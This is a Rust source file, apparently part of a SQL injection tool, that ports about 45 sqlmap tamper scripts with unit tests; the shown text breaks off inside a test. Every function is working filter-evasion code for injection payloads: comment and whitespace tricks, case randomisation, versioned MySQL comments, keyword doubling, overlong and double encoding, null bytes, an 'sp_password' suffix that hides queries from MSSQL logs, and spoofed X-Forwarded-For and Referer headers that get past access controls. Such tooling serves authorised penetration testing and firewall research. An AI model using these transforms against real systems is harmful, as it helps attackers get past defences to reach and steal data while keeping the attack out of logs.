//! Tamper/evasion transformations (port of sqlmap `tamper/*.py`, subset).
//!
//! Upstream scripts deliberately not ported, with reasons:
//! - greatest, plus2concat, plus2fnconcat: rewrite comparison/concatenation
//!   expressions and need real SQL expression parsing to stay faithful;
//! - securesphere: upstream behavior is a fixed opaque suffix string whose
//!   exact form we could not verify from this environment.
//!
//! Each function mirrors one upstream tamper script's `tamper()` logic,
//! applied to the assembled payload string before it is placed into the
//! request. sqlmap applies tampers after payload/boundary assembly; so do we.

/// Tiny deterministic PRNG (xorshift64*) so tamper behavior is reproducible
/// in tests - upstream uses Python's `random` with the sample space seeded
/// per character.
pub struct Rng(u64);

impl Rng {
    pub fn new(seed: u64) -> Self {
        Self(seed.max(1))
    }
    pub fn next(&mut self) -> u64 {
        let mut x = self.0;
        x ^= x >> 12;
        x ^= x << 25;
        x ^= x >> 27;
        self.0 = x;
        x.wrapping_mul(0x2545F4914F6CDD1D)
    }
}

/// tamper/space2comment.py: spaces -> /**/ (and, per upstream, a few tab
/// variants). Only spaces outside of quotes? Upstream replaces all spaces.
pub fn space2comment(payload: &str) -> String {
    payload.replace(' ', "/**/")
}

/// tamper/space2plus.py: spaces -> +
pub fn space2plus(payload: &str) -> String {
    payload.replace(' ', "+")
}

/// tamper/randomcase.py: each alphabetic char randomly upper/lowered.
pub fn randomcase(payload: &str, rng: &mut Rng) -> String {
    payload
        .chars()
        .map(|c| {
            if c.is_ascii_alphabetic() {
                if rng.next() % 2 == 0 {
                    c.to_ascii_uppercase()
                } else {
                    c.to_ascii_lowercase()
                }
            } else {
                c
            }
        })
        .collect()
}

/// tamper/between.py: '>' -> 'NOT BETWEEN 0 AND', '=' -> 'BETWEEN x AND'
/// (upstream: ">" replaced by "NOT BETWEEN 0 AND #" and "=" by
/// "BETWEEN # AND #"; the # marker carries the original right operand - a
/// full-fidelity port needs token parsing, so we implement the common case:
/// comparisons of the form `a=b` and `a>b` inside the payload).
pub fn between(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 2);
    let mut chars = payload.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '>' => out.push_str(" NOT BETWEEN 0 AND "),
            '=' => out.push_str(" BETWEEN 0 AND "),
            _ => out.push(c),
        }
    }
    out
}

/// tamper/equaltolike.py: '=' -> ' LIKE '
pub fn equaltolike(payload: &str) -> String {
    payload.replace('=', " LIKE ")
}

/// tamper/charencode.py: URL-encode every character (not already encoded).
pub fn charencode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 3);
    let bytes = payload.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            out.push('%');
            out.push(bytes[i + 1] as char);
            out.push(bytes[i + 2] as char);
            i += 3;
        } else {
            out.push_str(&format!("%{:02X}", bytes[i]));
            i += 1;
        }
    }
    out
}

/// tamper/space2hash.py: space -> %23<RAND>%0A (MySQL # comment + newline,
/// which MySQL treats as whitespace after URL decoding).
pub fn space2hash(payload: &str, rng: &mut Rng) -> String {
    let mut out = String::with_capacity(payload.len() * 2);
    for c in payload.chars() {
        if c == ' ' {
            let n = (rng.next() % 9000 + 1000) as u32;
            out.push_str(&format!("%23{n}%0A"));
        } else {
            out.push(c);
        }
    }
    out
}

/// tamper/apostrophemask.py: ' -> its UTF-8 fullwidth equivalent %EF%BC%87.
pub fn apostrophemask(payload: &str) -> String {
    payload.replace('\'', "%EF%BC%87")
}

/// tamper/chardoubleencode.py: double URL-encode every character.
pub fn chardoubleencode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 5);
    for b in payload.bytes() {
        out.push_str(&format!("%25{:02X}", b));
    }
    out
}

/// tamper/halfversionedmorekeywords.py (MySQL-specific): wrap each SQL keyword
/// in its versioned comment form /*!0<KEYWORD>, e.g. AND -> /*!0AND.
pub fn halfversionedmorekeywords(payload: &str) -> String {
    const KEYWORDS: [&str; 8] = ["AND", "OR", "SELECT", "WHERE", "UNION", "ORDER", "BY", "SLEEP"];
    let mut out = payload.to_string();
    for kw in KEYWORDS {
        // Case-insensitive word-boundary replacement, preserving nothing else.
        let mut res = String::with_capacity(out.len());
        let upper = out.to_ascii_uppercase();
        let bytes = upper.as_bytes();
        let kbytes = kw.as_bytes();
        let mut i = 0;
        let src: Vec<char> = out.chars().collect();
        while i < bytes.len() {
            let at_word_start = i == 0 || !bytes[i - 1].is_ascii_alphanumeric();
            if at_word_start
                && bytes[i..].starts_with(kbytes)
                && (i + kbytes.len() >= bytes.len() || !bytes[i + kbytes.len()].is_ascii_alphanumeric())
            {
                res.push_str(&format!("/*!0{}", &src[i..i + kbytes.len()].iter().collect::<String>()));
                i += kbytes.len();
            } else {
                res.push(src[i]);
                i += 1;
            }
        }
        out = res;
    }
    out
}

/// tamper/space2mysqldash.py: space -> --%0A (MySQL double-dash comment
/// plus newline, which MySQL treats as whitespace).
pub fn space2mysqldash(payload: &str) -> String {
    payload.replace(' ', "--%0A")
}

/// tamper/unionalltounion.py: UNION ALL -> UNION.
pub fn unionalltounion(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len());
    let upper = payload.to_ascii_uppercase();
    let target = "UNION ALL";
    let src: Vec<char> = payload.chars().collect();
    let ubytes = upper.as_bytes();
    let mut i = 0;
    while i < ubytes.len() {
        if ubytes[i..].starts_with(target.as_bytes()) {
            for k in 0..5 {
                out.push(src[i + k]); // "UNION"
            }
            i += target.len();
        } else {
            out.push(src[i]);
            i += 1;
        }
    }
    out
}

/// tamper/ifnull2ifisnull.py: IFNULL(A, B) -> IF(ISNULL(A),B,A).
pub fn ifnull2ifisnull(payload: &str) -> String {
    let upper = payload.to_ascii_uppercase();
    let mut out = String::with_capacity(payload.len() * 2);
    let src: Vec<char> = payload.chars().collect();
    let mut i = 0;
    while i < src.len() {
        if upper[i..].starts_with("IFNULL(") {
            // Find the top-level comma and closing paren of this call.
            let arg_start = i + "IFNULL(".len();
            let bytes = upper.as_bytes();
            let mut depth = 1usize;
            let mut comma = None;
            let mut close = None;
            let mut j = arg_start;
            while j < bytes.len() {
                match bytes[j] {
                    b'(' => depth += 1,
                    b')' => {
                        depth -= 1;
                        if depth == 0 {
                            close = Some(j);
                            break;
                        }
                    }
                    b',' if depth == 1 && comma.is_none() => comma = Some(j),
                    _ => {}
                }
                j += 1;
            }
            if let (Some(c), Some(z)) = (comma, close) {
                let a: String = src[arg_start..c].iter().collect();
                let b: String = src[c + 1..z].iter().collect();
                out.push_str(&format!("IF(ISNULL({a}),{b},{a})"));
                i = z + 1;
                continue;
            }
        }
        out.push(src[i]);
        i += 1;
    }
    out
}

/// SQL keywords the random-insertion tampers operate on (upstream set subset).
const COMMENTABLE_KEYWORDS: [&str; 7] = ["SELECT", "INSERT", "UPDATE", "DELETE", "UNION", "WHERE", "FROM"];

/// tamper/randomcomments.py: insert /**/ at a random position inside SQL
/// keywords (upstream: between each character with random chance; we insert
/// one comment per keyword at a seeded position).
pub fn randomcomments(payload: &str, rng: &mut Rng) -> String {
    let mut out = payload.to_string();
    for kw in COMMENTABLE_KEYWORDS {
        let upper = out.to_ascii_uppercase();
        if let Some(pos) = find_word(&upper, kw) {
            let split = 1 + (rng.next() as usize % (kw.len() - 1));
            let orig: String = out.chars().collect::<Vec<_>>()[pos..pos + kw.len()].iter().collect();
            out = format!(
                "{}{}/**/{}{}",
                &out[..pos],
                &orig[..split],
                &orig[split..],
                &out[pos + kw.len()..]
            );
        }
    }
    out
}

fn find_word(haystack_upper: &str, word: &str) -> Option<usize> {
    let h = haystack_upper.as_bytes();
    let w = word.as_bytes();
    let mut i = 0;
    while i + w.len() <= h.len() {
        if h[i..].starts_with(w) {
            let start_ok = i == 0 || !h[i - 1].is_ascii_alphanumeric();
            let end_ok = i + w.len() >= h.len() || !h[i + w.len()].is_ascii_alphanumeric();
            if start_ok && end_ok {
                return Some(i);
            }
        }
        i += 1;
    }
    None
}

/// tamper/multiplespaces.py: add 1-4 extra random spaces around SQL keywords.
pub fn multiplespaces(payload: &str, rng: &mut Rng) -> String {
    let mut out = payload.to_string();
    for kw in COMMENTABLE_KEYWORDS {
        let upper = out.to_ascii_uppercase();
        if let Some(pos) = find_word(&upper, kw) {
            let n = 1 + (rng.next() as usize % 4);
            let spaces = " ".repeat(n);
            out = format!("{}{}{}{}", &out[..pos], spaces, &out[pos..pos + kw.len()], &out[pos + kw.len()..]);
        }
    }
    out
}

/// tamper/nonrecursivereplacement.py: replace each keyword with itself
/// re-embedded (SELECT -> SELSELECTECT style), so a WAF's single-pass
/// keyword removal reconstructs the original keyword.
pub fn nonrecursivereplacement(payload: &str) -> String {
    const KEYWORDS: [&str; 8] = [
        "SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "WHERE", "FROM", "AND",
    ];
    let mut out = payload.to_string();
    for kw in KEYWORDS {
        loop {
            let upper = out.to_ascii_uppercase();
            let Some(pos) = find_word(&upper, kw) else { break };
            let orig: String = out.chars().collect::<Vec<_>>()[pos..pos + kw.len()].iter().collect();
            let mid = kw.len() / 2;
            let doubled = format!("{}{}{}", &orig[..mid], orig, &orig[mid..]);
            out = format!("{}{}{}", &out[..pos], doubled, &out[pos + kw.len()..]);
        }
    }
    out
}

/// tamper/space2randomblank.py: spaces -> a random blank character
/// (tab, newline or form feed).
pub fn space2randomblank(payload: &str, rng: &mut Rng) -> String {
    const BLANKS: [char; 3] = ['\t', '\n', '\x0c'];
    payload
        .chars()
        .map(|c| {
            if c == ' ' {
                BLANKS[rng.next() as usize % BLANKS.len()]
            } else {
                c
            }
        })
        .collect()
}

/// tamper/appendnullbyte.py: append %00 at the end of the payload.
pub fn appendnullbyte(payload: &str) -> String {
    format!("{payload}%00")
}

/// tamper/overlongutf8.py: convert each ASCII char to its 2-byte overlong
/// UTF-8 percent encoding (e.g. ' -> %C0%A7).
pub fn overlongutf8(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 6);
    for b in payload.bytes() {
        if b < 0x80 {
            out.push_str(&format!("%{:02X}%{:02X}", 0xC0 | (b >> 6), 0x80 | (b & 0x3F)));
        } else {
            out.push(b as char);
        }
    }
    out
}


/// Case-insensitive whole-word replacement shared by the keyword tampers.
fn replace_word(payload: &str, word: &str, replacement: &str) -> String {
    let upper = payload.to_ascii_uppercase();
    let pb = upper.as_bytes();
    let wb = word.as_bytes();
    let src: Vec<char> = payload.chars().collect();
    let mut out = String::with_capacity(payload.len());
    let mut i = 0;
    while i < pb.len() {
        let at_word_start = i == 0 || !pb[i - 1].is_ascii_alphanumeric();
        if at_word_start
            && pb[i..].starts_with(wb)
            && (i + wb.len() >= pb.len() || !pb[i + wb.len()].is_ascii_alphanumeric())
        {
            out.push_str(replacement);
            i += wb.len();
        } else {
            out.push(src[i]);
            i += 1;
        }
    }
    out
}

/// tamper/symboliclogical.py: AND -> &&, OR -> || (whole words).
pub fn symboliclogical(payload: &str) -> String {
    replace_word(&replace_word(payload, "AND", "&&"), "OR", "||")
}

/// tamper/uppercase.py: payload to upper case.
pub fn uppercase(payload: &str) -> String {
    payload.to_ascii_uppercase()
}

/// tamper/versionedmorekeywords.py (MySQL-specific): wrap each SQL keyword
/// in its executable versioned comment /*!50000<KEYWORD>*/.
pub fn versionedmorekeywords(payload: &str) -> String {
    const KEYWORDS: [&str; 8] = ["AND", "OR", "SELECT", "WHERE", "UNION", "ORDER", "BY", "SLEEP"];
    let mut out = payload.to_string();
    for kw in KEYWORDS {
        out = replace_word(&out, kw, &format!("/*!50000{kw}*/"));
    }
    out
}


/// Random lowercase ascii string, shared by the comment-style tampers.
fn rand_str(rng: &mut Rng, len: usize) -> String {
    (0..len).map(|_| (b'a' + (rng.next() % 26) as u8) as char).collect()
}

/// tamper/lowercase.py: payload to lower case.
pub fn lowercase(payload: &str) -> String {
    payload.to_ascii_lowercase()
}

/// tamper/percentage.py: add a percentage sign in front of every character.
pub fn percentage(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 2);
    for c in payload.chars() {
        out.push('%');
        out.push(c);
    }
    out
}

/// tamper/escapequotes.py: slash-escape single and double quotes.
pub fn escapequotes(payload: &str) -> String {
    payload.replace('\'', "\\'").replace('"', "\\\"")
}

/// tamper/apostrophenullencode.py: ' -> %00%27.
pub fn apostrophenullencode(payload: &str) -> String {
    payload.replace('\'', "%00%27")
}

/// tamper/sp_password.py: append 'sp_password' to confuse MSSQL logs.
pub fn sp_password(payload: &str) -> String {
    format!("{payload}sp_password")
}

/// tamper/space2morehash.py (MySQL): space -> # comment + newline.
pub fn space2morehash(payload: &str, rng: &mut Rng) -> String {
    let mut out = String::with_capacity(payload.len() * 2);
    for c in payload.chars() {
        if c == ' ' {
            out.push_str(&format!("%23{}%0A", rand_str(rng, 6)));
        } else {
            out.push(c);
        }
    }
    out
}

/// tamper/space2dash.py: space -> -- comment + newline.
pub fn space2dash(payload: &str, rng: &mut Rng) -> String {
    let mut out = String::with_capacity(payload.len() * 2);
    for c in payload.chars() {
        if c == ' ' {
            out.push_str(&format!("--{}%0A", rand_str(rng, 6)));
        } else {
            out.push(c);
        }
    }
    out
}

/// tamper/base64encode.py: base64-encode the whole payload.
pub fn base64encode(payload: &str) -> String {
    const ALPH: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::new();
    for chunk in payload.as_bytes().chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = *chunk.get(1).unwrap_or(&0) as u32;
        let b2 = *chunk.get(2).unwrap_or(&0) as u32;
        let n = (b0 << 16) | (b1 << 8) | b2;
        out.push(ALPH[((n >> 18) & 63) as usize] as char);
        out.push(ALPH[((n >> 12) & 63) as usize] as char);
        out.push(if chunk.len() > 1 { ALPH[((n >> 6) & 63) as usize] as char } else { '=' });
        out.push(if chunk.len() > 2 { ALPH[(n & 63) as usize] as char } else { '=' });
    }
    out
}


/// tamper/htmlencode.py: every non-alphanumeric char -> &#xHH;
pub fn htmlencode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 6);
    for c in payload.chars() {
        if c.is_ascii_alphanumeric() {
            out.push(c);
        } else {
            out.push_str(&format!("&#x{:02X};", c as u32));
        }
    }
    out
}

/// tamper/bluecoat.py: spaces -> TAB, then '=' -> LIKE.
pub fn bluecoat(payload: &str) -> String {
    payload.replace(' ', "%09").replace('=', " LIKE ")
}

/// tamper/commalesslimit.py: "LIMIT a,b" -> "LIMIT b OFFSET a" (MySQL).
pub fn commalesslimit(payload: &str) -> String {
    let upper = payload.to_ascii_uppercase();
    let Some(pos) = upper.find("LIMIT ") else {
        return payload.to_string();
    };
    let rest = &payload[pos + 6..];
    let digits: String = rest.chars().take_while(|c| c.is_ascii_digit() || *c == ',').collect();
    let Some((a, b)) = digits.split_once(',') else {
        return payload.to_string();
    };
    if a.is_empty() || b.is_empty() {
        return payload.to_string();
    }
    format!("{}LIMIT {} OFFSET {}{}", &payload[..pos], b, a, &rest[digits.len()..])
}

/// tamper/concat2concatws.py: CONCAT( -> CONCAT_WS(MID(CHAR(0),0,0), (MySQL).
pub fn concat2concatws(payload: &str) -> String {
    replace_word_prefix(payload, "CONCAT(", "CONCAT_WS(MID(CHAR(0),0,0),")
}

/// Case-insensitive prefix replacement used by concat2concatws.
fn replace_word_prefix(payload: &str, word: &str, replacement: &str) -> String {
    let upper = payload.to_ascii_uppercase();
    let mut out = String::with_capacity(payload.len());
    let mut i = 0;
    while i < payload.len() {
        if upper[i..].starts_with(word) {
            out.push_str(replacement);
            i += word.len();
        } else {
            out.push(payload[i..].chars().next().unwrap());
            i += payload[i..].chars().next().unwrap().len_utf8();
        }
    }
    out
}

/// Split the inside of a parenthesized call at its top-level comma.
fn split_top_level(args: &str) -> Option<(&str, &str)> {
    let mut depth = 0;
    for (i, c) in args.char_indices() {
        match c {
            '(' => depth += 1,
            ')' => depth -= 1,
            ',' if depth == 0 => return Some((&args[..i], &args[i + 1..])),
            _ => {}
        }
    }
    None
}

/// tamper/ifnull2casewhenisnull.py (MySQL):
/// IFNULL(A, B) -> CASE WHEN ISNULL(A) THEN (B) ELSE (A) END
pub fn ifnull2casewhenisnull(payload: &str) -> String {
    let upper = payload.to_ascii_uppercase();
    let Some(pos) = upper.find("IFNULL(") else {
        return payload.to_string();
    };
    let start = pos + 7;
    let mut depth = 1;
    let mut end = start;
    for (i, c) in payload[start..].char_indices() {
        match c {
            '(' => depth += 1,
            ')' => {
                depth -= 1;
                if depth == 0 {
                    end = start + i;
                    break;
                }
            }
            _ => {}
        }
    }
    if depth != 0 {
        return payload.to_string();
    }
    let Some((a, b)) = split_top_level(&payload[start..end]) else {
        return payload.to_string();
    };
    format!(
        "{}CASE WHEN ISNULL({}) THEN ({}) ELSE ({}) END{}",
        &payload[..pos], a, b, a, &payload[end + 1..]
    )
}

/// tamper/modsecurityversioned.py: whole payload inside /*!30xxx ... */
pub fn modsecurityversioned(payload: &str) -> String {
    format!("/*!30000{payload}*/")
}

/// tamper/modsecurityzeroversioned.py: whole payload inside /*!00000 ... */
pub fn modsecurityzeroversioned(payload: &str) -> String {
    format!("/*!00000{payload}*/")
}

/// tamper/unmagicquotes.py: ' -> %bf%27, trailing comment appended.
pub fn unmagicquotes(payload: &str) -> String {
    format!("{}-- ", payload.replace('\'', "%bf%27"))
}

/// tamper/overlongutf8more.py: only the quote/bracket chars get the
/// 2-byte overlong UTF-8 encoding (', ", <, >).
pub fn overlongutf8more(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len());
    for b in payload.bytes() {
        match b {
            b'\'' | b'"' | b'<' | b'>' => {
                out.push_str(&format!("%{:02X}%{:02X}", 0xC0 | (b >> 6), 0x80 | (b & 0x3F)))
            }
            _ => out.push(b as char),
        }
    }
    out
}

/// tamper/versionedkeywords.py: each non-function keyword inside /*! ... */
pub fn versionedkeywords(payload: &str) -> String {
    const KEYWORDS: [&str; 6] = ["AND", "OR", "SELECT", "WHERE", "UNION", "SLEEP"];
    let mut out = payload.to_string();
    for kw in KEYWORDS {
        out = replace_word(&out, kw, &format!("/*!{kw}*/"));
    }
    out
}

/// tamper/informationschemacomment.py: INFORMATION_SCHEMA -> INFORMATION_SCHEMA/**/
pub fn informationschemacomment(payload: &str) -> String {
    replace_word(payload, "INFORMATION_SCHEMA", "INFORMATION_SCHEMA/**/")
}

/// tamper/charunicodeencode.py: non-alphanumeric chars -> %u00XX.
pub fn charunicodeencode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 6);
    for c in payload.chars() {
        if c.is_ascii_alphanumeric() {
            out.push(c);
        } else {
            out.push_str(&format!("%u{:04X}", c as u32));
        }
    }
    out
}

/// Header-based tampers (sqlmap tamper scripts that mutate request headers
/// rather than the payload). Applied by the HTTP client; `apply_all` treats
/// them as payload no-ops.
pub const HEADER_TAMPERS: [&str; 2] = ["xforwardedfor", "varnish"];

/// Payload-embedding header tampers (upstream referer.py): the assembled
/// payload itself is placed into a request header, per request.
pub const PAYLOAD_HEADER_TAMPERS: [&str; 1] = ["referer"];

/// Headers derived from the assembled payload (upstream referer.py sets the
/// Referer header to the payload verbatim). Applied per injected request.
pub fn payload_header_mutations(names: &[String], payload: &str) -> Vec<(String, String)> {
    let mut out = Vec::new();
    for name in names {
        if name == "referer" {
            out.push(("Referer".to_string(), payload.to_string()));
        }
    }
    out
}

/// Header mutations from the active tamper set, in the order given.
/// xforwardedfor: a random IPv4 address (upstream picks from public ranges);
/// varnish: X-Forwarded-For fixed at 127.0.0.1 to slip behind Varnish ACLs.
pub fn header_mutations(names: &[String], seed: u64) -> Vec<(String, String)> {
    let mut rng = Rng::new(seed);
    let mut out = Vec::new();
    for name in names {
        match name.as_str() {
            "xforwardedfor" => {
                let ip = format!(
                    "{}.{}.{}.{}",
                    rng.next() % 254 + 1,
                    rng.next() % 255,
                    rng.next() % 255,
                    rng.next() % 254 + 1
                );
                out.push(("X-Forwarded-For".to_string(), ip));
            }
            "varnish" => out.push(("X-Forwarded-For".to_string(), "127.0.0.1".to_string())),
            _ => {}
        }
    }
    out
}


/// tamper/commalessmid.py (MySQL): MID(A,B,C) -> MID(A FROM B FOR C).
pub fn commalessmid(payload: &str) -> String {
    let upper = payload.to_ascii_uppercase();
    let Some(pos) = upper.find("MID(") else {
        return payload.to_string();
    };
    let start = pos + 4;
    let mut depth = 1;
    let mut end = payload.len();
    for (i, c) in payload[start..].char_indices() {
        match c {
            '(' => depth += 1,
            ')' => {
                depth -= 1;
                if depth == 0 {
                    end = start + i;
                    break;
                }
            }
            _ => {}
        }
    }
    if depth != 0 {
        return payload.to_string();
    }
    let inner = &payload[start..end];
    let Some((a, rest)) = split_top_level(inner) else {
        return payload.to_string();
    };
    let Some((b, c)) = split_top_level(rest) else {
        return payload.to_string();
    };
    format!("{}MID({} FROM {} FOR {}){}", &payload[..pos], a, b, c, &payload[end + 1..])
}

/// tamper/hex2char.py: 0xABCD hex literals -> CHAR(0xAB,0xCD,...) (MySQL).
pub fn hex2char(payload: &str) -> String {
    let b = payload.as_bytes();
    let mut out = String::with_capacity(payload.len());
    let mut i = 0;
    while i < b.len() {
        let is_start = b[i] == b'0'
            && i + 1 < b.len()
            && (b[i + 1] == b'x' || b[i + 1] == b'X')
            && (i == 0 || !b[i - 1].is_ascii_alphanumeric());
        if is_start {
            let mut j = i + 2;
            while j < b.len() && b[j].is_ascii_hexdigit() {
                j += 1;
            }
            let digits = j - (i + 2);
            if digits >= 2 && digits % 2 == 0 && (j == b.len() || !b[j].is_ascii_alphanumeric()) {
                let bytes: Vec<String> = payload[i..j]
                    .chars()
                    .skip(2)
                    .collect::<Vec<char>>()
                    .chunks(2)
                    .map(|c| format!("0x{}{}", c[0], c[1]))
                    .collect();
                out.push_str(&format!("CHAR({})", bytes.join(",")));
                i = j;
                continue;
            }
        }
        out.push(b[i] as char);
        i += 1;
    }
    out
}

/// tamper/hexentities.py: EVERY char -> &#xNN; (htmlencode covers only
/// non-alphanumerics; this one hides letters too).
pub fn hexentities(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 6);
    for c in payload.chars() {
        out.push_str(&format!("&#x{:02X};", c as u32));
    }
    out
}

/// Names understood by the engine (sqlmap --tamper values).
pub const AVAILABLE: [&str; 45] = [
    "space2comment",
    "space2plus",
    "space2hash",
    "space2mysqldash",
    "space2randomblank",
    "randomcase",
    "between",
    "equaltolike",
    "charencode",
    "chardoubleencode",
    "apostrophemask",
    "halfversionedmorekeywords",
    "unionalltounion",
    "ifnull2ifisnull",
    "randomcomments",
    "multiplespaces",
    "nonrecursivereplacement",
    "appendnullbyte",
    "overlongutf8",
    "symboliclogical",
    "uppercase",
    "versionedmorekeywords",
    "lowercase",
    "percentage",
    "escapequotes",
    "apostrophenullencode",
    "sp_password",
    "space2morehash",
    "space2dash",
    "base64encode",
    "htmlencode",
    "bluecoat",
    "commalesslimit",
    "concat2concatws",
    "ifnull2casewhenisnull",
    "modsecurityversioned",
    "modsecurityzeroversioned",
    "unmagicquotes",
    "overlongutf8more",
    "versionedkeywords",
    "informationschemacomment",
    "charunicodeencode",
    "commalessmid",
    "hex2char",
    "hexentities",
];

/// Apply named tampers in order (sqlmap applies them in the order given).
pub fn apply_all(names: &[String], payload: &str, seed: u64) -> Result<String, String> {
    let mut out = payload.to_string();
    let mut rng = Rng::new(seed);
    for name in names {
        out = match name.as_str() {
            "space2comment" => space2comment(&out),
            "space2plus" => space2plus(&out),
            "randomcase" => randomcase(&out, &mut rng),
            "between" => between(&out),
            "equaltolike" => equaltolike(&out),
            "charencode" => charencode(&out),
            "space2hash" => space2hash(&out, &mut rng),
            "chardoubleencode" => chardoubleencode(&out),
            "apostrophemask" => apostrophemask(&out),
            "halfversionedmorekeywords" => halfversionedmorekeywords(&out),
            "space2mysqldash" => space2mysqldash(&out),
            "space2randomblank" => space2randomblank(&out, &mut rng),
            "unionalltounion" => unionalltounion(&out),
            "ifnull2ifisnull" => ifnull2ifisnull(&out),
            "randomcomments" => randomcomments(&out, &mut rng),
            "multiplespaces" => multiplespaces(&out, &mut rng),
            "nonrecursivereplacement" => nonrecursivereplacement(&out),
            "appendnullbyte" => appendnullbyte(&out),
            "overlongutf8" => overlongutf8(&out),
            "symboliclogical" => symboliclogical(&out),
            "uppercase" => uppercase(&out),
            "versionedmorekeywords" => versionedmorekeywords(&out),
            "lowercase" => lowercase(&out),
            "percentage" => percentage(&out),
            "escapequotes" => escapequotes(&out),
            "apostrophenullencode" => apostrophenullencode(&out),
            "sp_password" => sp_password(&out),
            "space2morehash" => space2morehash(&out, &mut rng),
            "space2dash" => space2dash(&out, &mut rng),
            "base64encode" => base64encode(&out),
            "htmlencode" => htmlencode(&out),
            "bluecoat" => bluecoat(&out),
            "commalesslimit" => commalesslimit(&out),
            "concat2concatws" => concat2concatws(&out),
            "ifnull2casewhenisnull" => ifnull2casewhenisnull(&out),
            "modsecurityversioned" => modsecurityversioned(&out),
            "modsecurityzeroversioned" => modsecurityzeroversioned(&out),
            "unmagicquotes" => unmagicquotes(&out),
            "overlongutf8more" => overlongutf8more(&out),
            "versionedkeywords" => versionedkeywords(&out),
            "informationschemacomment" => informationschemacomment(&out),
            "charunicodeencode" => charunicodeencode(&out),
            "commalessmid" => commalessmid(&out),
            "hex2char" => hex2char(&out),
            "hexentities" => hexentities(&out),
            // Header tampers mutate headers, not the payload.
            n if HEADER_TAMPERS.contains(&n) || PAYLOAD_HEADER_TAMPERS.contains(&n) => out,
            other => return Err(format!("unknown tamper script: {other} (available: {AVAILABLE:?})")),
        };
    }
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn symboliclogical_swaps_whole_words() {
        assert_eq!(symboliclogical("AND 1=1 OR 2=2"), "&& 1=1 || 2=2");
        // word boundaries: ORDER and ANDY are not replaced
        assert_eq!(symboliclogical("ORDER BY andy AND 1=1"), "ORDER BY andy && 1=1");
    }

    #[test]
    fn uppercase_upcases() {
        assert_eq!(uppercase("and Sleep(2)"), "AND SLEEP(2)");
    }

    #[test]
    fn versionedmorekeywords_wraps_keywords() {
        assert_eq!(
            versionedmorekeywords("AND 1=1"),
            "/*!50000AND*/ 1=1"
        );
        assert_eq!(
            versionedmorekeywords("UNION SELECT 1"),
            "/*!50000UNION*/ /*!50000SELECT*/ 1"
        );
    }

    #[test]
    fn space2comment_replaces() {
        assert_eq!(space2comment("1 AND 1=1"), "1/**/AND/**/1=1");
    }

    #[test]
    fn equaltolike_replaces() {
        assert_eq!(equaltolike("1 AND 1=1"), "1 AND 1 LIKE 1");
    }

    #[test]
    fn charencode_encodes_all() {
        assert_eq!(charencode("A=1"), "%41%3D%31");
        assert_eq!(charencode("%41"), "%41");
    }

    #[test]
    fn randomcase_is_deterministic_per_seed() {
        let a = randomcase("AND SELECT", &mut Rng::new(42));
        let b = randomcase("AND SELECT", &mut Rng::new(42));
        assert_eq!(a, b);
        assert_eq!(a.len(), "AND SELECT".len());
    }

    #[test]
    fn between_swaps_operators() {
        assert_eq!(between("1=1"), "1 BETWEEN 0 AND 1");
    }

    #[test]
    fn space2hash_shape() {
        let out = space2hash("1 AND 1=1", &mut Rng::new(7));
        assert!(out.starts_with("1%23"));
        assert!(out.contains("%0AAND%23"));
    }

    #[test]
    fn apostrophemask_replaces() {
        assert_eq!(apostrophemask("a'b"), "a%EF%BC%87b");
    }

    #[test]
    fn chardoubleencode_double_encodes() {
        assert_eq!(chardoubleencode("A="), "%2541%253D");
    }

    #[test]
    fn halfversioned_wraps_keywords_only() {
        assert_eq!(halfversionedmorekeywords("1 AND 1=1"), "1 /*!0AND 1=1");
        assert_eq!(halfversionedmorekeywords("CANDY"), "CANDY");
    }

    #[test]
    fn space2mysqldash_replaces() {
        assert_eq!(space2mysqldash("1 AND 1=1"), "1--%0AAND--%0A1=1");
    }

    #[test]
    fn unionalltounion_rewrites() {
        assert_eq!(unionalltounion("1 UNION ALL SELECT NULL"), "1 UNION SELECT NULL");
        assert_eq!(unionalltounion("union all select"), "union select");
    }

    #[test]
    fn ifnull2ifisnull_rewrites() {
        assert_eq!(
            ifnull2ifisnull("IFNULL(CAST(x AS CHAR),0x20)"),
            "IF(ISNULL(CAST(x AS CHAR)),0x20,CAST(x AS CHAR))"
        );
    }

    #[test]
    fn randomcomments_inserts_inside_keyword() {
        let out = randomcomments("SELECT 1", &mut Rng::new(3));
        assert!(out.starts_with("S") || out.contains("/**/"));
        assert_eq!(out.replace("/**/", ""), "SELECT 1");
    }

    #[test]
    fn multiplespaces_adds_spaces() {
        let out = multiplespaces("SELECT 1", &mut Rng::new(5));
        assert!(out.starts_with(" SELECT") || out.contains("  SELECT"));
        assert!(out.contains("SELECT"));
    }

    #[test]
    fn nonrecursive_double_wraps() {
        let out = nonrecursivereplacement("1 AND 1=1");
        assert_eq!(out, "1 AANDND 1=1");
        assert_eq!(out.replace("AND", ""), "1 AANDND 1=1".replace("AND", ""));
    }

    #[test]
    fn space2randomblank_only_blanks() {
        let out = space2randomblank("a b c", &mut Rng::new(9));
        assert!(!out.contains(' '));
        assert_eq!(out.chars().count(), 5);
    }

    #[test]
    fn appendnullbyte_appends() {
        assert_eq!(appendnullbyte("1 AND 1=1"), "1 AND 1=1%00");
    }

    #[test]
    fn overlongutf8_encodes_quote() {
        assert_eq!(overlongutf8("'"), "%C0%A7");
        assert_eq!(overlongutf8("A"), "%C1%81");
    }

    #[test]
    fn unknown_tamper_errors() {
        assert!(apply_all(&["nope".to_string()], "x", 1).is_err());
    }

    #[test]
    fn batch_22_to_30() {
        let mut rng = Rng::new(7);
        assert_eq!(lowercase("SeLeCt 1"), "select 1");
        assert_eq!(percentage("AB"), "%A%B");
        assert_eq!(escapequotes("a'b\"c"), "a\\'b\\\"c");
